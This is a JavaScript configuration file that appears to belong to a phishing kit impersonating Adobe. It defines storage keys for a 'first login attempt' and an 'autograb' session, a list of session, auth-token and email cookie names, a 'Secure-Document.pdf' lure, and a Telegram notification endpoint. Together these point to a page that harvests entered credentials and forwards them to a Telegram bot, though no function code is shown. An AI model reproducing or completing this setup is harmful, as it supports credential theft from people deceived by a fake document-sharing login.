/**
 * Application Configuration
 *
 * This file centralizes constants and settings used throughout the application.
 * Using a configuration file improves maintainability and reduces "magic strings".
 * Environment variables are read from import.meta.env (Vite convention).
 */
export const config = {
  session: {
    // Key for storing the first login attempt data in sessionStorage.
    firstAttemptKey: 'adobe_first_attempt',
    // Key for storing the final session data in localStorage.
    sessionDataKey: 'adobe_autograb_session',
    // Cookie names for session management.
    cookieNames: ['adobe_session', 'sessionid', 'auth_token', 'logged_in', 'user_email'],
  },
  document: {
    // The path to the PDF document in the /public folder.
    path: '/document.pdf',
    // The filename for the downloaded PDF.
    downloadName: 'Secure-Document.pdf',
  },
  api: {
    // The endpoint for the Telegram notification serverless function.
    sendTelegramEndpoint: import.meta.env.VITE_TELEGRAM_ENDPOINT || '/.netlify/functions/sendTelegram',
  },
  analytics: {
    // Analytics tracking ID, sourced from environment variable.
    trackingId: import.meta.env.VITE_ANALYTICS_ID || '',
  },
};
